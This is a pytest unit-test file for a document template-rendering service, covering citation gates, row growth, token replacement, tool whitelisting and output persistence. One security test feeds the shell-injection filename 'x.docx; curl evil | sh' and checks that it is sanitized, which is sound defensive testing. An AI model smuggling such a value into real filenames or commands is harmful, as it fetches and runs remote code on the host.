"""Phase 101 — template render deterministic core (TMPL-02).

This is the cross-plan TDD contract for the trusted/arbitrary fill behavior. It is
the single test file the 101-VALIDATION.md per-task verification map points at:
every downstream Plan 101-0X `<verify>` command runs a `-k` slice of THIS file.

The production module these stubs target (created in Plan 101-02) is
``backend/app/services/template_render_service.py``. The expected importable
symbols (the contract the stubs assert against) are:

  - ``Cited``                          — Pydantic BaseModel (value / source_chunk_id /
                                          source_doc / source_page — all nullable)
  - the generic field-map shape        — ``build_generic_field_map_model`` OR a fixed
                                          ``GenericFieldMap`` envelope (Plan 02 pins it;
                                          the stub imports whatever Plan 02 exports)
  - ``check_coverage``                 — port of derive_fields.check_coverage
  - ``is_truncated``                   — the stop_reason==max_tokens / finish_reason==
                                          length guard
  - ``build_context``                  — port of render_docx.build_context + the D-11
                                          worded→numeric hook
  - ``render_docx_template``           — port of render_docx.render (DocxTemplate +
                                          SandboxedEnvironment(autoescape=True))
  - ``run_replace_docx``               — the arbitrary-path run-coalescing scalar
                                          replace (Plan 02 net-new)
  - ``assert_integrity`` / ``residual_tags_in`` — re-open + residual scan
  - ``select_engine``                  — "docxtpl" for AssetRef/library, "run_replace"
                                          for kind='template_input'

  Plan 101-02 has landed: ``app.services.template_render_service`` now exists, so
  the RED-by-design ``pytest.mark.xfail(strict=False)`` stubs in this file were
  upgraded to real BEHAVIORAL tests (every ``xfail`` marker dropped — a silent
  XPASS can no longer mask a regression; the 098/099/100 un-mark-on-landing
  convention — test_workspace_template.py:53-57). Imports of the now-created
  symbols stay INSIDE each test body (no behavior change). Offline-friendly: no
  live DB / Storage; the cross-provider half stays MANUAL in 101-VALIDATION.md.

    Plan 101-02 (template_render_service.py — the deterministic helpers):
      - test_field_map_covers_template_keys        — the cited field-map shape covers
        risk-register.docx's placeholder keys; Cited leaves are all nullable.
      - test_check_coverage_flags_uncited_and_invented — the deterministic citation
        gate flags uncited + invented before render.
      - test_truncated_emission_rejected           — is_truncated rejects a
        stop_reason=max_tokens / finish_reason=length emission.
      - test_trusted_render_grows_rows[1,5,20]      — docxtpl {%tr %} row growth
        (the spike's load-bearing surprise — Pitfall 5).
      - test_run_merge_replaces_split_token         — the arbitrary run-merge engine
        reassembles a token split across runs (SC#4 #1).
      - test_engine_selection_by_provenance         — engine chosen by PROVENANCE
        (AssetRef/library→docxtpl, template_input→run_replace).

Offline-friendly: no live DB / Storage; the cross-provider half stays MANUAL in
101-VALIDATION.md. The deterministic helpers are unit-testable in the backend venv
(docxtpl is pip-installed for the TEST tier even though production render is the
sealed sandbox — RESEARCH §Validation Architecture).
"""

from __future__ import annotations

import pathlib

import pytest

# Fixture paths resolved relative to this test file:
#   backend/tests/unit/test_template_render.py -> parents[1] == backend/tests
_FIXTURES = pathlib.Path(__file__).resolve().parents[1] / "fixtures" / "templates"
RISK_REGISTER_DOCX = _FIXTURES / "risk-register.docx"
SPLIT_TOKEN_DOCX = _FIXTURES / "arbitrary-split-token.docx"


# ── Plan 101-02 — the cited field-map shape + coverage oracle ─────────────────


def test_field_map_covers_template_keys():
    """The Plan-02 generic field-map covers risk-register.docx's placeholder keys,
    and the ``Cited`` leaf is all-nullable (``Cited().value is None``)."""
    from docxtpl import DocxTemplate

    from app.services.template_render_service import Cited

    # Cited leaves are all nullable — a not-found-in-KB value is a clean decline.
    c = Cited()
    assert c.value is None
    assert c.source_chunk_id is None
    assert c.source_doc is None
    assert c.source_page is None

    # The coverage oracle: the field-map shape must cover the template's top-level keys.
    placeholder_keys = DocxTemplate(str(RISK_REGISTER_DOCX)).get_undeclared_template_variables()
    assert {"project_name", "report_date", "rows"} <= placeholder_keys

    # Plan 02 pins whether the generic shape is built from the keys or a fixed envelope.
    try:
        from app.services.template_render_service import build_generic_field_map_model

        model_cls = build_generic_field_map_model(sorted(placeholder_keys))
    except ImportError:
        from app.services.template_render_service import GenericFieldMap as model_cls

    # Whatever Plan 02 exports must validate an empty/declined field-map (all-nullable).
    assert model_cls is not None


def test_check_coverage_flags_uncited_and_invented():
    """The deterministic citation check (NO LLM) flags an invented citation
    (source_chunk_id not in the retrieved set) and an uncited value (value present,
    source_chunk_id null) BEFORE render (Pitfall 6 / D-08 failure class 1)."""
    from app.services.template_render_service import check_coverage

    retrieved_ids = {"chunk-1", "chunk-2"}
    placeholder_keys = ["project_name", "report_date", "rows"]

    fm_dict = {
        "project_name": {"value": "Meridian", "source_chunk_id": "chunk-1"},   # valid
        "report_date": {"value": "2026-06-10", "source_chunk_id": "chunk-99"},  # invented
        "rows": [
            {"risk_id": {"value": "R-01", "source_chunk_id": None}},            # uncited
        ],
    }

    stats = check_coverage(fm_dict, retrieved_ids, placeholder_keys)
    assert stats["invented_citation_count"] == 1
    assert stats["uncited_value_count"] == 1


def test_truncated_emission_rejected():
    """A truncated tool-JSON emission (stop_reason=max_tokens / finish_reason=length)
    is rejected — never accept a truncated empty field-map as 'no data found'
    (the spike's Rule-1 guard — derive_fields.py:267)."""
    from app.services.template_render_service import is_truncated

    assert is_truncated({"stop_reason": "max_tokens"}) is True
    assert is_truncated({"stop_reason": "tool_use"}) is False
    # finish_reason=="length" is the OpenAI-family alias for the same condition.
    assert is_truncated({"finish_reason": "length"}) is True
    assert is_truncated({"finish_reason": "stop"}) is False


@pytest.mark.parametrize("n_rows", [1, 5, 20])
def test_trusted_render_grows_rows(tmp_path, n_rows):
    """The trusted docxtpl path grows the {%tr %} register once per row — the
    spike's load-bearing surprise (Pitfall 5). Build a context with N rows, render
    risk-register.docx, re-open via assert_integrity, assert table rows == header(1)
    + N."""
    from app.services.template_render_service import (
        assert_integrity,
        build_context,
        render_docx_template,
    )

    field_map_dict = {
        "project_name": {"value": "Meridian"},
        "report_date": {"value": "2026-06-10"},
        "rows": [
            {
                "risk_id": {"value": f"R-{i:02d}"},
                "cause": {"value": "c"},
                "event": {"value": "e"},
                "effect": {"value": "f"},
                "probability": {"value": "2"},
                "impact": {"value": "3"},
                "response_strategy": {"value": "mitigate"},
                "owner": {"value": "owner"},
                "status": {"value": "open"},
            }
            for i in range(n_rows)
        ],
    }
    ctx = build_context(field_map_dict)
    out = tmp_path / "filled.docx"
    render_docx_template(str(RISK_REGISTER_DOCX), ctx, str(out))

    verdict = assert_integrity(str(out), "docx")
    # header(1) + N grown body rows.
    assert verdict["rows"] == 1 + n_rows


def test_run_merge_replaces_split_token(tmp_path):
    """The arbitrary non-Jinja run-merge engine reassembles a {{token}} split across
    multiple <w:r> runs and replaces it (SC#4 #1). After fill, the residual-tag scan
    is empty — no silent non-fill survived."""
    from app.services.template_render_service import (
        residual_tags_in,
        run_replace_docx,
    )

    out = tmp_path / "filled.docx"
    run_replace_docx(str(SPLIT_TOKEN_DOCX), {"client_name": "Acme Co"}, str(out))

    from docx import Document

    text = "\n".join(p.text for p in Document(str(out)).paragraphs)
    assert "Acme Co" in text
    assert residual_tags_in(str(out), "docx") == []


def test_engine_selection_by_provenance():
    """Engine selection is by PROVENANCE (D-02): a library AssetRef → docxtpl/Jinja;
    an ephemeral kind='template_input' upload → the non-Jinja run-replace engine
    (an untrusted upload NEVER reaches Jinja → SSTI structurally impossible)."""
    from app.services.template_render_service import select_engine

    assert select_engine("library") == "docxtpl"
    assert select_engine("template_input") == "run_replace"


# ── Plan 101-04 — the render_template tool handler (the integration piece) ────
#
# These are the OFFLINE-testable slices of the BEFORE-render citation gate and the
# AFTER-render integrity gate. The full sandbox render + the cross-provider field-map
# emission are LIVE UAT (101-VALIDATION.md Manual-Only). Both tests monkeypatch the
# resolver + the sandbox session to PROVE the gate short-circuits BEFORE the sandbox
# is ever reached (the BEFORE gate) and that an integrity failure preserves the
# field-map without persisting (the AFTER gate).

import asyncio
import json


def _make_ctx(**overrides):
    """A minimal duck-typed ToolContext for the offline handler tests.

    The handler only touches: pool, supabase, thread_id, current_user, redis,
    run_id, emit, and settings.sandbox_enabled (module-level). We provide stub
    attributes and let the monkeypatched resolver / sandbox short-circuit before
    any real I/O.
    """
    from app.services.tool_dispatcher import ToolContext

    base = dict(
        redis=None,
        run_id="00000000-0000-0000-0000-0000000000ff",
        thread_id="11111111-1111-1111-1111-111111111111",
        supabase=object(),
        pool=object(),
        user_settings=None,
        current_user={"id": "22222222-2222-2222-2222-222222222222"},
        folder_subtree_ids=None,
        scoped_folder_path=None,
        emit=_noop_emit,
        spawn=lambda *a, **k: None,
    )
    base.update(overrides)
    return ToolContext(**base)


async def _noop_emit(*args, **kwargs):
    return None


def test_render_template_rejects_uncited_before_render(monkeypatch):
    """The BEFORE-render citation gate (D-08 class 1): a field-map carrying an INVENTED
    citation (source_chunk_id not in retrieved_ids) is rejected WITHOUT resolving the
    template or touching the sandbox. We poison resolve_template_source + the sandbox
    manager so a reject is the ONLY way the test can pass — if the gate let the call
    through, these would raise."""
    import app.services.tool_dispatcher as td

    def _boom_resolve(*args, **kwargs):
        raise AssertionError("resolve_template_source must NOT be called before the citation gate")

    def _boom_sandbox(*args, **kwargs):
        raise AssertionError("the sandbox must NOT be reached before the citation gate")

    # Patch at the import sites the handler uses (function-scope imports resolve to the
    # service modules, so patch there).
    monkeypatch.setattr(
        "app.services.template_asset_service.resolve_template_source", _boom_resolve
    )
    monkeypatch.setattr(td.sandbox_manager, "get_or_create", _boom_sandbox)

    args = {
        "field_map": {
            "scalars": {
                # invented: source_chunk_id is not in retrieved_ids
                "project_name": {"value": "Meridian", "source_chunk_id": "chunk-99"},
            },
            "collections": {},
        },
        "retrieved_ids": ["chunk-1", "chunk-2"],
        "out_filename": "out.docx",
    }
    ctx = _make_ctx()

    result = asyncio.run(td._handle_render_template(args, ctx))
    payload = json.loads(result.result)
    assert payload["status"] == "rejected"
    assert payload["reason"] == "uncited_or_invented"
    # The invented citation was actually counted (gate ran the real check_coverage).
    assert payload["stats"]["invented_citation_count"] == 1


def test_render_template_integrity_fail_preserves_field_map(monkeypatch):
    """The AFTER-render integrity gate (D-08 class 2): when the sandbox verdict reports
    opened=False, the handler returns status=failed, PRESERVES the cited field-map as
    fallback output, and does NOT call ws_write_file (a corrupt file is NEVER
    delivered — SC#4 #3)."""
    import app.services.tool_dispatcher as td

    # A clean, fully-cited field-map so the BEFORE gate passes.
    field_map = {
        "scalars": {"project_name": {"value": "Meridian", "source_chunk_id": "chunk-1"}},
        "collections": {},
    }

    # Resolver returns real-looking bytes + provenance (library → docxtpl engine).
    async def _fake_resolve(*args, **kwargs):
        return {
            "bytes": b"PK\x03\x04 fake docx bytes",
            "filename": "template.docx",
            "provenance": "library",
            "mime": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            "error": None,
        }

    monkeypatch.setattr(
        "app.services.template_asset_service.resolve_template_source", _fake_resolve
    )
    # Force sandbox_enabled True so the handler proceeds to the sandbox run.
    monkeypatch.setattr(td.settings, "sandbox_enabled", True)

    # Fake the sandbox ship+run to return an integrity FAILURE verdict (opened=False).
    async def _fake_threadpool(fn, *args, **kwargs):
        return {
            "verdict": {"rendered": True, "opened": False, "error": "won't open"},
            "stdout": '{"rendered": true, "opened": false}',
            "produced": None,
        }

    monkeypatch.setattr(td, "run_in_threadpool", _fake_threadpool)

    # ws_write_file must NEVER be called — poison it.
    async def _boom_write(*args, **kwargs):
        raise AssertionError("ws_write_file must NOT be called when integrity fails")

    monkeypatch.setattr(td, "ws_write_file", _boom_write)

    args = {
        "field_map": field_map,
        "retrieved_ids": ["chunk-1"],
        "out_filename": "out.docx",
        "asset": {
            "asset_id": "user/_library/template.docx",
            "filename": "template.docx",
            "kind": "template",
            "mime": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        },
    }
    ctx = _make_ctx()

    result = asyncio.run(td._handle_render_template(args, ctx))
    payload = json.loads(result.result)
    assert payload["status"] == "failed"
    assert payload["reason"] == "integrity"
    # The cited field-map is preserved as fallback so the extracted data isn't lost (D-08).
    assert payload["field_map"] == field_map


def test_render_driver_is_self_contained():
    """The sandbox render driver (_RENDER_DRIVER_SRC) is syntactically valid Python and
    is dependency-free w.r.t. the backend package — the container has no `app` on its
    path, so the driver must NOT import `app.*`."""
    from app.services.tool_dispatcher import _RENDER_DRIVER_SRC

    # Compiles without SyntaxError — it is valid, shippable Python.
    compile(_RENDER_DRIVER_SRC, "<render_driver>", "exec")

    # No backend-package imports (the sandbox has no backend/app on its path).
    assert "import app." not in _RENDER_DRIVER_SRC
    assert "from app." not in _RENDER_DRIVER_SRC

    # The docxtpl branch uses the SandboxedEnvironment(autoescape=True) (TMPL-03)...
    assert "SandboxedEnvironment(autoescape=True)" in _RENDER_DRIVER_SRC
    # ...and prints exactly one JSON verdict line.
    assert "json.dumps" in _RENDER_DRIVER_SRC
    assert "print(" in _RENDER_DRIVER_SRC

    # The integrity re-open uses the SAME library per format (docx/pptx/xlsx).
    assert "Document(" in _RENDER_DRIVER_SRC
    assert "Presentation(" in _RENDER_DRIVER_SRC
    assert "load_workbook(" in _RENDER_DRIVER_SRC


# ── Plan 101-05 — admit render_template to a fill phase (the 099 whitelist pattern) ──
#
# The last seam: a harness FILL phase that DECLARES render_template in its
# available_tools gets it admitted on BOTH layers (the schemas the model sees +
# the phase_whitelist dispatch backstop) via the 099 _effective_tools /
# _build_phase_tool_context pattern — with NO Deep widening and NO gateway branch.
# Offline: SimpleNamespace phase/ctx (mirrors test_099_skill_composition.py:71-100);
# no live LLM, no DB, no sandbox.

from types import SimpleNamespace
from uuid import uuid4


def _fill_phase(available_tools, *, skill_snapshot=None):
    """A minimal llm_agent phase namespace for _effective_tools /
    _build_phase_tool_context (mirrors test_099_skill_composition.py:_phase)."""
    return SimpleNamespace(
        config=SimpleNamespace(
            phase_type="llm_agent",
            skill_ref=None,
            skill_snapshot=skill_snapshot,
            available_tools=list(available_tools),
            folder_scope=None,
            model=None,
        )
    )


def _harness_ctx():
    """A minimal harness ctx bag — producer_run_id is REQUIRED (the seam raises without it)."""
    return SimpleNamespace(
        producer_run_id=uuid4(),
        run_id=uuid4(),
        folder_subtree_ids=None,
        skill_snapshot=None,
        model="m",
    )


def test_fill_phase_admits_render_template():
    """A fill phase that DECLARES render_template (no skill snapshot) gets it admitted
    on BOTH layers via the 099 pattern: _effective_tools returns it unchanged, and
    _build_phase_tool_context threads it into available_tools (layer 1) AND the
    phase_whitelist frozenset (layer 2 — the dispatch backstop). No new code path —
    the declared tool simply flows through the never-drop helper."""
    from app.services.harness.phase_types import (
        _build_phase_tool_context,
        _effective_tools,
    )

    phase = _fill_phase(["search_documents", "render_template"])

    # Layer-0: the helper returns the declared tool unchanged (never dropped).
    eff = _effective_tools(phase)
    assert "render_template" in eff
    # No skill snapshot → read_skill_file is NOT injected (only the declared tools).
    assert "read_skill_file" not in eff

    # Both layers admit it: available_tools (model sees) + phase_whitelist (dispatch).
    tc = _build_phase_tool_context(phase, _harness_ctx())
    assert "render_template" in tc.available_tools
    assert tc.phase_whitelist is not None and "render_template" in tc.phase_whitelist


def test_non_fill_phase_excludes_render_template():
    """A phase that does NOT declare render_template never gets it — there is no
    auto-injection (no Deep widening; the gated-no-op invariant holds). The tool is
    admitted ONLY when the phase explicitly lists it in available_tools."""
    from app.services.harness.phase_types import (
        _build_phase_tool_context,
        _effective_tools,
    )

    phase = _fill_phase(["search_documents"])

    eff = _effective_tools(phase)
    assert "render_template" not in eff

    tc = _build_phase_tool_context(phase, _harness_ctx())
    assert "render_template" not in tc.available_tools
    assert tc.phase_whitelist is not None and "render_template" not in tc.phase_whitelist


def test_deep_mode_whitelist_none_noop():
    """In Deep mode phase_whitelist is None, so the dispatch_tool guard is a literal
    no-op (byte-identical to pre-091 dispatch). A plain ToolContext defaults
    phase_whitelist=None; the guard's predicate (`ctx.phase_whitelist is not None`)
    is therefore False and render_template (or any tool) is never refused by the
    backstop — the admission this plan adds is gated to harness fill phases only.
    Mirrors the 099 test_deep_noop shape (assert the gate short-circuits)."""
    from app.services.tool_dispatcher import ToolContext

    # A plain Deep-mode ToolContext: phase_whitelist defaults to None.
    ctx = ToolContext(
        redis=None,
        run_id="00000000-0000-0000-0000-0000000000ff",
        thread_id="11111111-1111-1111-1111-111111111111",
        supabase=object(),
        pool=object(),
        user_settings=None,
        current_user={"id": "22222222-2222-2222-2222-222222222222"},
        folder_subtree_ids=None,
        scoped_folder_path=None,
        emit=None,
        spawn=lambda *a, **k: None,
    )
    # The dispatch guard branch (tool_dispatcher.dispatch_tool:2314) is entered ONLY
    # when phase_whitelist is not None — in Deep it is None, so the backstop is skipped.
    assert ctx.phase_whitelist is None
    # Therefore the guard predicate is False — render_template would NOT be refused by
    # the whitelist backstop in Deep (the gated-no-op invariant; Deep byte-identical).
    assert (ctx.phase_whitelist is not None and "render_template" not in ctx.phase_whitelist) is False


# ── 101-06 gap-closure tests (the HAPPY-PATH + visibility coverage that was missing) ──
#
# The review (101-REVIEW.md) found WR-01/WR-02 shipped GREEN because ONLY the reject/
# fail branches were tested — no test asserted the schema reaches the model (WR-01) or
# that a passing render persists (WR-02). These add that coverage so the findings can
# never regress.


def test_render_template_schema_reaches_model_when_whitelisted():
    """101-06 WR-01 / IR-02 — the render_template SCHEMA is admitted into the per-phase
    tools_override when whitelisted, and is ABSENT from plain get_tools() (Deep clean).

    This is the exact assertion IR-02 said was missing: the registry/admission tests
    checked the handler was registered + whitelist-admitted, but NOTHING asserted a
    render_template SCHEMA reaches apply_tool_budget's output. A whitelisted NAME with
    no SCHEMA is a no-op — that gap is why WR-01 (uncallable tool) shipped green."""
    from app.services.openai_service import (
        RENDER_TEMPLATE_TOOL,
        apply_tool_budget,
        get_tools,
    )

    # (a) Deep stays byte-identical: render_template is NOT in plain get_tools().
    deep_names = [t["function"]["name"] for t in get_tools()]
    assert "render_template" not in deep_names, (
        "REGRESSION: render_template leaked into get_tools() — Deep must stay clean"
    )

    # (b) The schema is well-formed and wraps the args the handler reads.
    assert RENDER_TEMPLATE_TOOL["function"]["name"] == "render_template"
    props = RENDER_TEMPLATE_TOOL["function"]["parameters"]["properties"]
    for key in ("field_map", "retrieved_ids", "out_filename", "asset", "emission_meta"):
        assert key in props, f"render_template schema missing arg {key!r}"

    # (c) When whitelisted, augmenting the candidate list with the schema BEFORE the
    # budget call makes it survive apply_tool_budget (it is whitelisted → never dropped).
    candidates = get_tools() + [RENDER_TEMPLATE_TOOL]
    wl = frozenset({"render_template", "search_documents"})
    override = apply_tool_budget(candidates, "gpt-4o", wl)
    override_names = [t["function"]["name"] for t in override]
    assert "render_template" in override_names, (
        "render_template schema was dropped by apply_tool_budget despite being whitelisted"
    )
    # Only the whitelisted tools survive the filter.
    assert set(override_names) <= wl


def test_harness_fill_phase_tools_override_contains_render_template():
    """101-06 WR-01 (harness-level) — a fill phase that DECLARES render_template produces
    a tools_override CONTAINING the render_template schema via _phase_tools_override.

    This proves the END-TO-END layer-1 wiring: phase.available_tools → whitelist →
    _phase_tools_override augments candidates → apply_tool_budget keeps the schema."""
    from app.services.harness.phase_types import _effective_tools, _phase_tools_override

    phase = _fill_phase(["search_documents", "render_template"])
    whitelist = frozenset(_effective_tools(phase))
    override = _phase_tools_override(whitelist, "gpt-4o", None)
    names = [t["function"]["name"] for t in override]
    assert "render_template" in names

    # A phase that does NOT declare it gets a tools_override WITHOUT the schema.
    plain = _fill_phase(["search_documents"])
    plain_wl = frozenset(_effective_tools(plain))
    plain_override = _phase_tools_override(plain_wl, "gpt-4o", None)
    assert "render_template" not in [t["function"]["name"] for t in plain_override]


def test_render_template_success_path_persists_with_leading_slash(monkeypatch):
    """101-06 WR-02 — a render that passes BOTH gates persists with a LEADING-SLASH
    workspace path and returns status='ok' (not persist_failed).

    The pre-fix handler called ws_write_file(path=out_filename) with a bare basename;
    validate_path requires a leading '/' → PathValidationError → persist_failed, silently
    dropping a deliverable that passed both gates. This asserts ws_write_file IS called
    with a leading-slash path and the handler returns ok."""
    import app.services.tool_dispatcher as td

    field_map = {
        "scalars": {"project_name": {"value": "Meridian", "source_chunk_id": "chunk-1"}},
        "collections": {},
    }

    async def _fake_resolve(*args, **kwargs):
        return {
            "bytes": b"PK\x03\x04 fake docx bytes",
            "filename": "template.docx",
            "provenance": "library",
            "mime": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            "error": None,
        }

    monkeypatch.setattr(
        "app.services.template_asset_service.resolve_template_source", _fake_resolve
    )
    monkeypatch.setattr(td.settings, "sandbox_enabled", True)

    # Sandbox run returns a PASSING verdict (rendered + opened + residual_clean) + bytes.
    async def _fake_threadpool(fn, *args, **kwargs):
        return {
            "verdict": {
                "rendered": True,
                "opened": True,
                "residual_clean": True,
                "residual_tags": [],
            },
            "stdout": "{}",
            "produced": b"PK\x03\x04 produced docx bytes",
        }

    monkeypatch.setattr(td, "run_in_threadpool", _fake_threadpool)

    # Capture the path ws_write_file is called with — it MUST start with '/'.
    seen = {}

    async def _capture_write(pool, supabase, *, thread_id, user_id, path, content):
        seen["path"] = path
        seen["content"] = content
        return {
            "file_id": "33333333-3333-3333-3333-333333333333",
            "path": path,
            "version": 1,
            "size_bytes": len(content),
            "mime_type": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        }

    monkeypatch.setattr(td, "ws_write_file", _capture_write)

    args = {
        "field_map": field_map,
        "retrieved_ids": ["chunk-1"],
        "out_filename": "deliverable.docx",  # bare basename — the WR-02 trigger
        "asset": {
            "asset_id": "user/_library/template.docx",
            "filename": "template.docx",
            "kind": "template",
            "mime": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        },
    }
    ctx = _make_ctx()

    result = asyncio.run(td._handle_render_template(args, ctx))
    payload = json.loads(result.result)
    assert payload["status"] == "ok", f"expected ok, got {payload}"
    # WR-02: ws_write_file WAS called, and with a LEADING-SLASH path.
    assert seen.get("path", "").startswith("/"), f"persist path lacks leading slash: {seen.get('path')!r}"
    assert seen["path"] == "/deliverable.docx"
    assert seen["content"] == b"PK\x03\x04 produced docx bytes"


def test_render_template_malicious_out_filename_sanitized(monkeypatch):
    """101-06 CR-01 — a malicious out_filename (shell injection / path traversal) is
    sanitized to a safe basename and the sandbox command never carries the payload.

    We capture the command string passed to session.execute_command and assert the
    injection payload never appears in it (the basename is sanitized to deliverable.docx
    and every token is shlex-quoted)."""
    import app.services.tool_dispatcher as td

    field_map = {
        "scalars": {"project_name": {"value": "Meridian", "source_chunk_id": "chunk-1"}},
        "collections": {},
    }

    async def _fake_resolve(*args, **kwargs):
        return {
            "bytes": b"PK\x03\x04 fake docx bytes",
            "filename": "template.docx",
            "provenance": "library",
            "mime": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            "error": None,
        }

    monkeypatch.setattr(
        "app.services.template_asset_service.resolve_template_source", _fake_resolve
    )
    monkeypatch.setattr(td.settings, "sandbox_enabled", True)

    # A fake sandbox session that RECORDS every command string it is asked to run.
    commands = []

    class _FakeSession:
        def execute_command(self, cmd):
            commands.append(cmd)

            class _R:
                stdout = '{"rendered": true, "opened": true, "residual_clean": true, "residual_tags": []}'

            return _R()

        def copy_to_runtime(self, local, remote):
            return None

        def copy_from_runtime(self, remote, local):
            return None

    monkeypatch.setattr(td.sandbox_manager, "get_or_create", lambda *a, **k: _FakeSession())

    # Run the real _ship_and_run via the real threadpool (no produced harvest needed —
    # we only assert the COMMAND is clean; harvest finding nothing → persist short-circuit
    # is acceptable for this security assertion).
    async def _passthrough_threadpool(fn, *a, **k):
        return fn()

    monkeypatch.setattr(td, "run_in_threadpool", _passthrough_threadpool)

    async def _noop_write(*a, **k):
        return {
            "file_id": "x", "path": "/deliverable.docx", "version": 1,
            "size_bytes": 0, "mime_type": "application/octet-stream",
        }

    monkeypatch.setattr(td, "ws_write_file", _noop_write)

    payload_name = "x.docx; curl evil | sh"
    args = {
        "field_map": field_map,
        "retrieved_ids": ["chunk-1"],
        "out_filename": payload_name,
        "asset": {
            "asset_id": "user/_library/template.docx",
            "filename": "template.docx",
            "kind": "template",
            "mime": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        },
    }
    ctx = _make_ctx()

    asyncio.run(td._handle_render_template(args, ctx))

    assert commands, "the sandbox command was never built"
    # The render command is the LAST execute_command (after the mkdir).
    render_cmd = commands[-1]
    # The injection payload must NEVER appear in the command string.
    assert "curl" not in render_cmd, f"injection payload leaked into command: {render_cmd!r}"
    assert "; " not in render_cmd or "sh" not in render_cmd
    # The sanitized basename is what reaches the container output path.
    assert "deliverable.docx" in render_cmd, f"sanitized basename missing: {render_cmd!r}"
    # And the path-separator/metachar payload is gone.
    assert "evil" not in render_cmd


def test_render_template_residual_tokens_not_delivered(monkeypatch):
    """101-06 WR-03 — a verdict with rendered=True, opened=True, residual_clean=False is
    NOT delivered: status=failed, reason=residual_tokens, residual_tags surfaced, and
    ws_write_file is never called (a half-filled file with surviving {{tokens}} is a
    silent non-fill the gate must block)."""
    import app.services.tool_dispatcher as td

    field_map = {
        "scalars": {"project_name": {"value": "Meridian", "source_chunk_id": "chunk-1"}},
        "collections": {},
    }

    async def _fake_resolve(*args, **kwargs):
        return {
            "bytes": b"PK\x03\x04 fake docx bytes",
            "filename": "template.docx",
            "provenance": "library",
            "mime": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            "error": None,
        }

    monkeypatch.setattr(
        "app.services.template_asset_service.resolve_template_source", _fake_resolve
    )
    monkeypatch.setattr(td.settings, "sandbox_enabled", True)

    async def _fake_threadpool(fn, *args, **kwargs):
        return {
            "verdict": {
                "rendered": True,
                "opened": True,
                "residual_clean": False,
                "residual_tags": ["{{project_name}}"],
            },
            "stdout": "{}",
            "produced": b"PK\x03\x04 half-filled docx",
        }

    monkeypatch.setattr(td, "run_in_threadpool", _fake_threadpool)

    async def _boom_write(*args, **kwargs):
        raise AssertionError("ws_write_file must NOT be called when residual tokens survive")

    monkeypatch.setattr(td, "ws_write_file", _boom_write)

    args = {
        "field_map": field_map,
        "retrieved_ids": ["chunk-1"],
        "out_filename": "deliverable.docx",
        "asset": {
            "asset_id": "user/_library/template.docx",
            "filename": "template.docx",
            "kind": "template",
            "mime": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
        },
    }
    ctx = _make_ctx()

    result = asyncio.run(td._handle_render_template(args, ctx))
    payload = json.loads(result.result)
    assert payload["status"] == "failed"
    assert payload["reason"] == "residual_tokens"
    assert payload["residual_tags"] == ["{{project_name}}"]
    # The cited field-map is preserved as fallback so the extracted data isn't lost.
    assert payload["field_map"] == field_map


def test_driver_replace_coalesces_matched_token_equal_to_original():
    """101-06 WR-04 — the sandbox driver's _replace_in_paragraph coalesces a matched
    token EVEN when the net blanked text equals the original paragraph text.

    The OLD driver guard `if blanked_text == full: return` skipped this case, leaving the
    stray token run intact (a silent non-fill). The fixed driver mirrors production's
    `touched = matched or (blanked_text != replaced_text)` so it coalesces and clears the
    stray run. We exec the driver source and exercise its helper directly against the
    same case the audited production helper handles."""
    from app.services.tool_dispatcher import _RENDER_DRIVER_SRC
    from app.services.template_render_service import (
        _replace_in_paragraph as prod_replace,
    )

    ns: dict = {}
    exec(_RENDER_DRIVER_SRC, ns)
    driver_replace = ns["_replace_in_paragraph"]

    class _Run:
        def __init__(self, text):
            self.text = text

    class _Para:
        def __init__(self, run_texts):
            self.runs = [_Run(t) for t in run_texts]

        @property
        def text(self):
            return "".join(r.text for r in self.runs)

    # full = "AB", runs ['A','{{z}}','B'], z -> '' : replaced text == full ("AB") BUT a
    # token WAS matched → must coalesce (touched via matched), clearing the stray run.
    dd = _Para(["A", "{{z}}", "B"])
    pd = _Para(["A", "{{z}}", "B"])
    driver_replace(dd, {"z": ""})
    prod_replace(pd, {"z": ""})

    assert dd.text == "AB", f"driver text: {dd.text!r}"
    assert pd.text == "AB", f"production text: {pd.text!r}"
    # The stray token run must be cleared (coalesced) — NOT left as '{{z}}'.
    assert dd.runs[1].text == "", f"driver left a stray token run: {dd.runs[1].text!r}"
    assert "{{z}}" not in "".join(r.text for r in dd.runs)
    # Driver and production agree on the result (IR-01: they must not diverge).
    assert dd.text == pd.text
